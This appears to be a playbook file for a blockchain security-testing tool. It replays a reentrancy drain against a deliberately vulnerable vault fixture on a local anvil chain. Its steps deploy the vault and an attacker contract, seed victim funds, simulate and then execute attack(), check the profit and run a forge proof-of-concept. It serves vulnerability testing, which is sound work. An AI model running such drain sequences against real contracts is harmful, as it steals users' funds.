# End-to-end replay of the reentrant-vault corpus fixture (BTV-L2-001,
# reentrancy — the classic external-call-before-state-update bug):
#
#   boot chain -> deploy fixture -> simulate the entire reentrancy drain
#   via eth_call (no transaction broadcast) -> execute the attack
#   on-chain -> verify attacker profit -> reproduce with a forge PoC
#
# Run from the repo root:
#   bin/blocktack campaign \
#     --target corpus/fixtures/reentrant-vault/target.yaml \
#     --playbook playbooks/evm/reentrant-vault.yaml
apiVersion: blocktack/v1
kind: Playbook
name: reentrant-vault-replay
description: >
  Full replay of a reentrancy drain: the campaign deploys a vulnerable
  vault and attacker contract on a local chain, first confirms the drain
  by pure simulation (eth_call executes the full reentrancy without
  broadcasting anything), then executes it for real and verifies profit.
target:
  chainTypes: [evm]
  layers: [L2]
steps:
  - id: env-up
    name: Start local anvil node
    tactic: setup
    run:
      type: shell
      command: anvil
      args: ["--port", "8545"]
      background: true

  - id: wait-for-rpc
    name: Wait for the RPC endpoint to accept requests
    tactic: setup
    run:
      type: shell
      command: sh
      args:
        - "-c"
        - |
          for i in $(seq 1 50); do
            cast block-number --rpc-url http://127.0.0.1:8545 >/dev/null 2>&1 && exit 0
            sleep 0.2
          done
          echo "anvil did not come up" >&2
          exit 1

  - id: identify-chain
    name: Fingerprint the chain via the engine
    tactic: discover
    run:
      type: engine
      engine: blocktack-evm
      action: fingerprint

  - id: deploy-vault
    name: Deploy the vulnerable vault
    tactic: setup
    run:
      type: shell
      command: sh
      args:
        - "-c"
        - |
          KEY0="$(awk '/Private Keys/{p=1;next} p && /^\(0\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
          forge create --broadcast \
            --root corpus/fixtures/reentrant-vault \
            src/ReentrantVault.sol:ReentrantVault \
            --rpc-url http://127.0.0.1:8545 \
            --private-key "$KEY0"

  - id: deploy-attacker
    name: Deploy the reentrancy attacker contract
    tactic: setup
    run:
      type: shell
      command: sh
      args:
        - "-c"
        - |
          KEY0="$(awk '/Private Keys/{p=1;next} p && /^\(0\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
          VAULT="$(grep -m1 'Deployed to:' "$BLOCKTACK_OUT_DIR/steps/deploy-vault.log" | grep -oE '0x[0-9a-fA-F]{40}')"
          forge create --broadcast \
            --root corpus/fixtures/reentrant-vault \
            src/ReentrantAttacker.sol:ReentrantAttacker \
            --rpc-url http://127.0.0.1:8545 \
            --private-key "$KEY0" \
            --constructor-args "$VAULT"

  - id: seed-vault
    name: Seed the vault with victim funds
    tactic: setup
    run:
      type: shell
      command: sh
      args:
        - "-c"
        - |
          KEY2="$(awk '/Private Keys/{p=1;next} p && /^\(2\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
          VAULT="$(grep -m1 'Deployed to:' "$BLOCKTACK_OUT_DIR/steps/deploy-vault.log" | grep -oE '0x[0-9a-fA-F]{40}')"
          cast send "$VAULT" --value 10ether \
            --rpc-url http://127.0.0.1:8545 --private-key "$KEY2"

  - id: simulate-attack
    name: Simulate the full reentrancy drain via eth_call
    tactic: exploit
    precondition: simulation executes the entire reentrancy without broadcasting a transaction
    run:
      type: engine
      engine: blocktack-evm
      action: simulate-call
      options:
        to: "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512" # attacker contract (deterministic)
        function: "attack()"
        from: "0x70997970C51812dc3A010C7d01b50e0d17dc79C8" # anvil account 1
        value: "1000000000000000000"

  - id: execute-attack
    name: Execute the reentrancy attack on-chain
    tactic: exploit
    run:
      type: shell
      command: sh
      args:
        - "-c"
        - |
          KEY1="$(awk '/Private Keys/{p=1;next} p && /^\(1\)/{print $2; exit}' "$BLOCKTACK_OUT_DIR/steps/env-up.log")"
          ATTACKER="$(grep -m1 'Deployed to:' "$BLOCKTACK_OUT_DIR/steps/deploy-attacker.log" | grep -oE '0x[0-9a-fA-F]{40}')"
          cast send "$ATTACKER" "attack()" --value 1ether \
            --rpc-url http://127.0.0.1:8545 --private-key "$KEY1"

  - id: verify-pnl
    name: Verify attacker contract profit via balance delta
    tactic: verify
    run:
      type: engine
      engine: blocktack-evm
      action: verify-pnl
      options:
        attacker: "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512" # attacker contract
        blocksAgo: 4

  - id: forge-poc
    name: Reproduce the exploit with a forge PoC test
    tactic: verify
    run:
      type: adapter
      adapter: foundry
      options:
        sourceDir: corpus/fixtures/reentrant-vault
        weakness: BTV-L2-001

verification:
  - id: simulation-confirmed
    expects: simulate-attack reports the attack() call succeeds — the drain works in pure simulation
  - id: onchain-drain
    expects: verify-pnl records a critical finding — the attacker contract gained ~11 ETH
  - id: poc-confirmed
    expects: the foundry adapter records a confirmed critical finding for test_poc_reentrancy_drains_vault
